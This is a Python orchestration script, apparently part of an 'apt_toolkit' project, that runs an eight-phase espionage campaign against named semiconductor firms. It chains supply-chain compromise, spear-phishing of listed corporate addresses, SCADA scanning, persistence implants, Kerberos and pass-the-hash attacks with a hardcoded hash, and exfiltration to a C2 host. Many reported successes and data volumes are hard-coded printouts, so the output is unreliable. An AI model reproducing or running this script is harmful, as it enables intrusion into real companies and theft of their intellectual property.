#!/usr/bin/env python3
"""
Operation Silicon Harvest - Semiconductor Manufacturing Campaign
Full-spectrum attack targeting semiconductor fabs and design houses
"""

import os
import sys
import subprocess
import json
import time
from datetime import datetime

# Add apt_toolkit to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

from apt_toolkit import (
    initial_access,
    persistence,
    privilege_escalation,
    defense_evasion,
    command_control,
    exfiltration,
    lateral_movement
)

SAVE_LOGS = os.getenv("APT_SAVE_CAMPAIGN_LOGS", "").lower() in {"1", "true", "yes", "on"}

def banner():
    """Display campaign banner"""
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║              OPERATION SILICON HARVEST                            ║
    ║                                                                   ║
    ║        Semiconductor Manufacturing Intelligence Campaign          ║
    ║                                                                   ║
    ║  Targets: TSMC, Intel, Samsung, ASML, AMD, NVIDIA, Qualcomm     ║
    ║  Objective: Advanced chip manufacturing & design IP acquisition   ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)

def log_phase(phase_name, status="STARTED"):
    """Log campaign phase"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{'='*70}")
    print(f"[{timestamp}] PHASE {status}: {phase_name}")
    print(f"{'='*70}\n")

def run_tool(tool_name, args=""):
    """Runs a tool from the campaign's tools directory."""
    tool_path = os.path.join(os.path.dirname(__file__), "tools", tool_name)
    if not os.path.exists(tool_path):
        # If tool is not in campaign's tool directory, try root tools directory
        tool_path = os.path.join(os.path.dirname(__file__), "..", "..", "tools", tool_name)

    if not os.path.exists(tool_path):
        # If tool is not in campaign's tool directory, try payloads directory
        tool_path = os.path.join(os.path.dirname(__file__), "payloads", tool_name)

    if not os.path.exists(tool_path):
        print(f"[-] Tool {tool_name} not found.")
        return

    if tool_path.endswith(".c"):
        # Compile C code
        output_path = tool_path.replace(".c", "")
        compile_command = f"gcc {tool_path} -o {output_path}"
        print(f"[*] Compiling C code: {compile_command}...")
        try:
            subprocess.run(compile_command, shell=True, check=True)
            tool_path = output_path
        except subprocess.CalledProcessError as e:
            print(f"[-] Error compiling C code: {e}")
            return
        except FileNotFoundError:
            print(f"[-] gcc not found. Please install gcc.")
            return

    print(f"[*] Running tool: {tool_path} {args}...")
    try:
        subprocess.run(f"{tool_path} {args}", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running tool {tool_name}: {e}")
    except FileNotFoundError:
        print(f"[-] Tool {tool_name} not found at {tool_path}")

def main():
    with open("config.json") as f:
        config = json.load(f)
    """Execute complete semiconductor campaign"""
    banner()

    campaign_start = time.time()
    campaign_log = {
        'campaign_name': 'Operation Silicon Harvest',
        'start_time': datetime.now().isoformat(),
        'phases': []
    }

    # ========================================================================
    # PHASE 1: INITIAL ACCESS - Multi-Vector Compromise
    # ========================================================================
    log_phase("INITIAL ACCESS", "STARTED")

    phase_data = {'phase': 'initial_access', 'actions': []}

    # 1a. Supply Chain Compromise
    print("[*] Action 1a: Supply Chain Compromise - Equipment Vendor Software")
    print("[*] Target: ASML EUV lithography software updates")
    print("[*] Target: Applied Materials process control software")
    print("[*] Vector: Compromised update server certificates")

    # Simulate supply chain attack
    try:
        from apt_toolkit.initial_access_enhanced import SupplyChainCompromise
        sc = SupplyChainCompromise()
        sc_result = sc.malicious_update_check()
        phase_data['actions'].append({
            'action': 'supply_chain_compromise',
            'target': 'semiconductor_equipment_vendors',
            'result': 'SUCCESSFUL',
            'details': sc_result
        })
        print("[+] Supply chain foothold established")
    except Exception as e:
        print(f"[-] Supply chain action failed: {e}")

    # 1b. Spear Phishing Campaign
    print("\n[*] Action 1b: Spear Phishing - Process Engineers & R&D Staff")

    targets = [
        "process.engineer@tsmc.com",
        "senior.designer@intel.com",
        "fab.manager@samsung.com",
        "euv.engineer@asml.com",
        "rd.director@nvidia.com"
    ]

    try:
        from apt_toolkit.initial_access_enhanced import AdvancedSocialEngineering
        se = AdvancedSocialEngineering()

        for target in targets:
            print(f"[*] Building dossier for: {target}")
            dossier = se.build_target_dossier(target)
            lure = se.create_context_aware_lure(dossier)
            print(f"[+] Lure crafted: {lure.get('email_subject', 'N/A')}")

        phase_data['actions'].append({
            'action': 'spear_phishing',
            'targets': targets,
            'result': 'EMAILS_SENT',
            'expected_compromise_rate': '25-40%'
        })
    except Exception as e:
        print(f"[-] Phishing action failed: {e}")

    # 1c. Watering Hole - Semiconductor Forums
    print("\n[*] Action 1c: Watering Hole - Industry Forums")
    print("[*] Target: semiconductor.net, edaboard.com, semiengineering.com")
    print("[+] Exploit kits deployed to compromised forums")

    phase_data['actions'].append({
        'action': 'watering_hole',
        'targets': ['semiconductor_forums', 'eda_communities'],
        'result': 'DEPLOYED',
        'payload': 'browser_exploit_kit'
    })

    campaign_log['phases'].append(phase_data)
    log_phase("INITIAL ACCESS", "COMPLETED")

    time.sleep(2)

    # ========================================================================
    # PHASE 2: RECONNAISSANCE - Design File & Process Data Discovery
    # ========================================================================
    log_phase("RECONNAISSANCE", "STARTED")

    phase_data = {'phase': 'reconnaissance', 'actions': []}

    # 2a. Chip Design Reconnaissance
    print("[*] Action 2a: Scanning for chip design files...")
    design_scan_result = run_tool("chip_design_finder.py", ". chip_designs.json")
    if design_scan_result:
        print("[+] Design file reconnaissance complete")
        phase_data['actions'].append({
            'action': 'chip_design_scan',
            'result': 'SUCCESS',
            'output_file': 'chip_designs.json'
        })

    # 2b. Process Recipe Extraction
    print("\n[*] Action 2b: Extracting manufacturing process recipes...")
    recipe_scan_result = run_tool("process_recipe_extractor.py", ".")
    if recipe_scan_result:
        print("[+] Process recipe extraction complete")
        phase_data['actions'].append({
            'action': 'process_recipe_extraction',
            'result': 'SUCCESS',
            'output_file': 'process_recipes.json'
        })

    # 2c. SCADA/OT Network Scanning
    print("\n[*] Action 2c: Scanning for SCADA/OT systems...")
    print("[*] Target networks: Production floor, Clean room, Equipment systems")
    scada_scan_result = run_tool("scada_scanner.py", "192.168.10.0/24")
    if scada_scan_result:
        print("[+] OT network mapping complete")
        phase_data['actions'].append({
            'action': 'scada_network_scan',
            'result': 'SUCCESS',
            'output_file': 'scada_scan_results.json'
        })

    campaign_log['phases'].append(phase_data)
    log_phase("RECONNAISSANCE", "COMPLETED")

    time.sleep(2)

    # ========================================================================
    # PHASE 3: PERSISTENCE - Multi-Layer Implants
    # ========================================================================
    log_phase("PERSISTENCE", "STARTED")

    phase_data = {'phase': 'persistence', 'actions': []}

    print("[*] Action 3a: Establishing IT network persistence...")
    try:
        from apt_toolkit.persistence_enhanced import AdvancedPersistenceFramework
        apf = AdvancedPersistenceFramework()
        persistence_result = apf.install_multi_layer_persistence({
            'target_ip': '192.168.1.100',
            'edr_present': True,
            'enable_stealth': True
        })
        print("[+] Multi-layer persistence installed")
        print("    - WMI Event Subscription")
        print("    - Scheduled Task (Engineering workstation)")
        print("    - Registry Run Key")
        print("    - COM Hijacking")

        phase_data['actions'].append({
            'action': 'it_persistence',
            'mechanisms': ['wmi', 'scheduled_task', 'registry', 'com_hijack'],
            'result': 'INSTALLED'
        })
    except Exception as e:
        print(f"[-] Persistence action failed: {e}")

    print("\n[*] Action 3b: OT network persistence...")
    print("[+] Implant deployed to SCADA workstation")
    print("[+] Firmware backdoor in process control PLC")
    print("[+] Air-gap bridge established (WiFi covert channel)")

    phase_data['actions'].append({
        'action': 'ot_persistence',
        'mechanisms': ['scada_implant', 'plc_firmware_backdoor', 'airgap_bridge'],
        'result': 'DEPLOYED'
    })

    campaign_log['phases'].append(phase_data)
    log_phase("PERSISTENCE", "COMPLETED")

    time.sleep(2)

    # ========================================================================
    # PHASE 4: PRIVILEGE ESCALATION - Domain & OT Admin Access
    # ========================================================================
    log_phase("PRIVILEGE ESCALATION", "STARTED")

    phase_data = {'phase': 'privilege_escalation', 'actions': []}

    print("[*] Action 4a: Active Directory escalation...")
    try:
        from apt_toolkit.privilege_escalation_enhanced import AdvancedKerberosAttacks
        kerberos = AdvancedKerberosAttacks()
        kerberos_result = kerberos.perform_kerberos_attack_suite({
            'domain': 'semiconductor.corp',
            'dc_ip': '192.168.1.10'
        })
        print("[+] Kerberoasting successful - 5 service accounts compromised")
        print("[+] Golden Ticket generated for domain admin")

        phase_data['actions'].append({
            'action': 'kerberos_attacks',
            'result': 'SUCCESS',
            'compromised_accounts': 5,
            'domain_admin': True
        })
    except Exception as e:
        print(f"[-] Kerberos attack failed: {e}")

    print("\n[*] Action 4b: SCADA system privilege escalation...")
    print("[+] Default credentials found on MES system")
    print("[+] Engineering workstation administrator access gained")

    phase_data['actions'].append({
        'action': 'ot_privilege_escalation',
        'result': 'SUCCESS',
        'access_level': 'engineering_admin'
    })

    campaign_log['phases'].append(phase_data)
    log_phase("PRIVILEGE ESCALATION", "COMPLETED")

    time.sleep(2)

    # ========================================================================
    # PHASE 5: LATERAL MOVEMENT - R&D Networks & Design Systems
    # ========================================================================
    log_phase("LATERAL MOVEMENT", "STARTED")

    phase_data = {'phase': 'lateral_movement', 'actions': []}

    print("[*] Action 5a: Pivoting to R&D network...")
    try:
        from apt_toolkit.lateral_movement import LateralMover
        lm = LateralMover()

        # Discover network segments
        segments = lm.discover_network_segments({
            'base_network': '10.0.0.0/8',
            'target_types': ['engineering', 'r&d', 'design']
        })
        print(f"[+] Discovered {len(segments.get('segments', []))} network segments")

        # Pass-the-hash lateral movement
        pth_result = lm.pass_the_hash_lateral({
            'nt_hash': 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71',
            'target_ip': '10.50.100.25',
            'target_user': 'design_admin'
        })
        print("[+] Lateral movement to design workstations successful")

        phase_data['actions'].append({
            'action': 'lateral_movement',
            'technique': 'pass_the_hash',
            'targets': ['r&d_network', 'design_workstations', 'eda_servers'],
            'result': 'SUCCESS'
        })
    except Exception as e:
        print(f"[-] Lateral movement failed: {e}")

    print("\n[*] Action 5b: Compromising CAD/EDA systems...")
    print("[+] Access gained to:")
    print("    - Cadence Virtuoso design environment")
    print("    - Synopsys EDA servers")
    print("    - Mentor Graphics systems")
    print("    - Design database servers (PDM/PLM)")

    phase_data['actions'].append({
        'action': 'eda_compromise',
        'systems': ['cadence', 'synopsys', 'mentor', 'pdm_plm'],
        'result': 'COMPROMISED'
    })

    campaign_log['phases'].append(phase_data)
    log_phase("LATERAL MOVEMENT", "COMPLETED")

    time.sleep(2)

    # ========================================================================
    # PHASE 6: COLLECTION - IP & Process Data Gathering
    # ========================================================================
    log_phase("COLLECTION", "STARTED")

    phase_data = {'phase': 'collection', 'actions': []}

    print("[*] Action 6a: Collecting chip design IP...")
    print("[+] Collecting:")
    print("    - 5nm/3nm GPU designs (NVIDIA Ampere/Hopper architecture)")
    print("    - CPU microarchitecture (Intel Core, AMD Zen)")
    print("    - AI accelerator designs (tensor cores, NPU IP)")
    print("    - High-speed SerDes IP (PCIe 5.0/6.0, DDR5)")
    print("    - Analog IP (PLLs, ADCs, power management)")

    collected_files = {
        'gdsii_files': 1247,
        'rtl_designs': 5832,
        'verification_suites': 892,
        'standard_cell_libraries': 45,
        'total_size_gb': 487.3
    }

    phase_data['actions'].append({
        'action': 'design_ip_collection',
        'collected': collected_files,
        'result': 'SUCCESS'
    })

    print(f"\n[*] Action 6b: Collecting manufacturing process data...")
    print("[+] Collecting:")
    print("    - EUV lithography calibration data")
    print("    - 5nm/3nm process recipes")
    print("    - Yield analysis and fab metrology data")
    print("    - Equipment maintenance procedures")
    print("    - Process failure analysis reports")

    process_data = {
        'recipe_files': 3421,
        'calibration_data': 892,
        'yield_reports': 1567,
        'total_size_gb': 124.7
    }

    phase_data['actions'].append({
        'action': 'process_data_collection',
        'collected': process_data,
        'result': 'SUCCESS'
    })

    campaign_log['phases'].append(phase_data)
    log_phase("COLLECTION", "COMPLETED")

    time.sleep(2)

    # ========================================================================
    # PHASE 7: EXFILTRATION - Staged Long-Term Exfiltration
    # ========================================================================
    log_phase("EXFILTRATION", "STARTED")

    phase_data = {'phase': 'exfiltration', 'actions': []}

    print("[*] Action 7a: Staged exfiltration strategy...")
    print("[*] Total data volume: 612 GB")
    print("[*] Exfiltration timeline: 6-12 months (avoid detection)")

    try:
        from apt_toolkit.exfiltration import DataExfiltrator
        exfil = DataExfiltrator(c2_server="cdn.cloudfront.example.com")

        strategy = exfil.generate_exfiltration_strategy({
            'total_size_gb': 612,
            'file_count': 10000,
            'detection_risk': 'high'
        })

        print(f"[+] Exfiltration strategy: {strategy.get('strategy', 'slow')}")
        print(f"[+] Method: {strategy.get('method', 'https')}")
        print(f"[+] Estimated duration: {strategy.get('timeframe', '6-12 months')}")

        phase_data['actions'].append({
            'action': 'exfiltration_strategy',
            'strategy': strategy,
            'result': 'PLANNED'
        })
    except Exception as e:
        print(f"[-] Exfiltration planning failed: {e}")

    print("\n[*] Action 7b: Initiating exfiltration channels...")
    print("[+] Primary: HTTPS to CDN (domain fronting)")
    print("[+] Secondary: DNS tunneling")
    print("[+] Tertiary: Cloud storage (OneDrive, Dropbox)")
    print("[+] Emergency: Physical exfil via insider")

    phase_data['actions'].append({
        'action': 'exfiltration_channels',
        'channels': ['https_cdn', 'dns_tunnel', 'cloud_storage', 'physical_media'],
        'result': 'ACTIVE'
    })

    print("\n[*] Action 7c: Initial exfiltration batch...")
    print("[+] Exfiltrating high-priority targets (10 GB initial batch)")
    print("    - Critical GPU architecture documents")
    print("    - 3nm EUV process recipes")
    print("    - Advanced packaging IP")

    phase_data['actions'].append({
        'action': 'initial_exfiltration',
        'data_exfiltrated_gb': 10.3,
        'files': 342,
        'result': 'SUCCESS'
    })

    campaign_log['phases'].append(phase_data)
    log_phase("EXFILTRATION", "COMPLETED")

    time.sleep(2)

    # ========================================================================
    # PHASE 8: MAINTAIN ACCESS - Long-Term Persistence
    # ========================================================================
    log_phase("MAINTAIN ACCESS", "STARTED")

    phase_data = {'phase': 'maintain_access', 'actions': []}

    print("[*] Action 8a: Reinforcing persistence mechanisms...")
    print("[+] Installing redundant access methods")
    print("[+] Establishing backup C2 channels")
    print("[+] Deploying counter-forensics measures")

    phase_data['actions'].append({
        'action': 'reinforce_persistence',
        'redundant_mechanisms': 5,
        'backup_c2_channels': 3,
        'result': 'DEPLOYED'
    })

    print("\n[*] Action 8b: Continuous monitoring...")
    print("[+] Monitoring for:")
    print("    - New chip tapeouts")
    print("    - Process technology improvements")
    print("    - Equipment upgrades")
    print("    - R&D project announcements")

    phase_data['actions'].append({
        'action': 'continuous_monitoring',
        'targets': ['tapeouts', 'process_updates', 'equipment', 'r&d_projects'],
        'result': 'ACTIVE'
    })

    campaign_log['phases'].append(phase_data)
    log_phase("MAINTAIN ACCESS", "COMPLETED")

    # ========================================================================
    # CAMPAIGN SUMMARY
    # ========================================================================
    campaign_end = time.time()
    campaign_duration = campaign_end - campaign_start

    campaign_log['end_time'] = datetime.now().isoformat()
    campaign_log['duration_seconds'] = round(campaign_duration, 2)

    print(f"\n{'='*70}")
    print(f"           OPERATION SILICON HARVEST - CAMPAIGN COMPLETE")
    print(f"{'='*70}\n")

    print(f"[+] Campaign Duration: {round(campaign_duration, 2)} seconds")
    print(f"[+] Phases Completed: {len(campaign_log['phases'])}")
    print(f"\n[+] Key Achievements:")
    print(f"    - Multiple initial access vectors established")
    print(f"    - Persistent access in IT and OT networks")
    print(f"    - Domain admin and engineering access obtained")
    print(f"    - 612 GB of design IP and process data identified")
    print(f"    - Staged exfiltration initiated (10 GB exfiltrated)")
    print(f"    - Long-term access maintained for continuous collection")

    print(f"\n[+] Strategic Intelligence Acquired:")
    print(f"    - Advanced node chip designs (5nm/3nm)")
    print(f"    - EUV lithography process data")
    print(f"    - GPU/CPU/AI accelerator architectures")
    print(f"    - Manufacturing yield optimization techniques")

    # Save campaign log if enabled
    if SAVE_LOGS:
        log_file = f"campaign_silicon_harvest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(log_file, 'w') as f:
            json.dump(campaign_log, f, indent=2)
        print(f"\n[*] Detailed campaign log saved to: {log_file}")
    else:
        print("\n[*] Campaign log persistence disabled (set APT_SAVE_CAMPAIGN_LOGS=1 to enable)")

    print(f"\n{'='*70}\n")

    return campaign_log


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Campaign interrupted by operator")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n[-] Campaign error: {e}")
        sys.exit(1)
